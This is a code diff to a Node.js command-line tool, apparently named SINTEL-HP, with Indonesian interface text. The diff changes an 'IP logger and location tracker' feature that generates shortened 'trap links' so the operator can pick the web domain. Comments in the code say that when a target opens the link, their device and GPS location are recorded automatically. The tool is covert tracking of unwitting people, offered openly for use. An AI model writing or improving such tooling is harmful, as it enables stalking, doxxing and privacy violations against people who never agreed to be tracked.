@@ -106,9 +106,15 @@ function handleGetContactGuide() {
 async function handleLinkLogger() {
     console.log('\n' + chalk.bold.bgRed(' REAL IP LOGGER & LOCATION TRACKER '));
     console.log(chalk.yellow('Fitur Tracking IP sekarang udah FULL VERSION pindah ke Dashboard Web. Ga usah pake Discord lagi!'));
-    console.log(chalk.gray('Buka website tool kita di Vercel (contoh: https://sintel.neoma.space) buat ngecek dashboard Real-Timenya langsung jalan di Browser.'));
+    console.log(chalk.gray('Buka website tool kita di Vercel buat ngecek dashboard Real-Timenya langsung jalan di Browser.'));
 
-    const { url } = await inquirer.prompt([
+    const { domain, url } = await inquirer.prompt([
+        {
+            type: 'input',
+            name: 'domain',
+            message: 'Masukkan Domain Web Vercel lu (contoh: sintel.vercel.app / sintel.neoma.space):',
+            default: 'sintel.vercel.app'
+        },
         {
             type: 'input',
             name: 'url',
@@ -117,11 +123,13 @@ async function handleLinkLogger() {
         }
     ]);
 
+    // Ensure domain has https protocol formatting
+    const baseUrl = domain.startsWith('http') ? domain : `https://${domain}`;
     const topicId = 'sintel_' + Math.random().toString(36).substring(2, 10);
     const tBase = Buffer.from(url).toString('base64');
 
     // Fallback if they run in localhost / CLI without Web
-    const trapLink = `https://sintel.neoma.space/api/trap?topic=${topicId}&t=${tBase}`;
+    const trapLink = `${baseUrl}/api/trap?topic=${topicId}&t=${tBase}`;
     let shortLink = trapLink;
 
     const spinner = ora('Membuat link jebakan pendek...').start();
@@ -134,7 +142,7 @@ async function handleLinkLogger() {
 
     printSuccess('Link Pelacakan Berhasil Dibuat (REAL)!');
     console.log(`\n🕸️ Link Jebakan: ${chalk.green.bold.underline(shortLink)}`);
-    console.log(`⏱️ Cek Hasil Klik Di: ${chalk.blue.underline('Buka Web SINTEL-HP lu di Vercel, masuk ke Menu Live GPS Tracker')}`);
+    console.log(`⏱️ Cek Hasil Klik Di: ${chalk.blue.underline('Buka Web SINTEL-HP lu, masuk ke Menu Live GPS Tracker')}`);
     console.log(chalk.dim('\nTips: Selama target buka shortlink, perangkat & lokasi dia auto-kerekam!'));
 
     main();
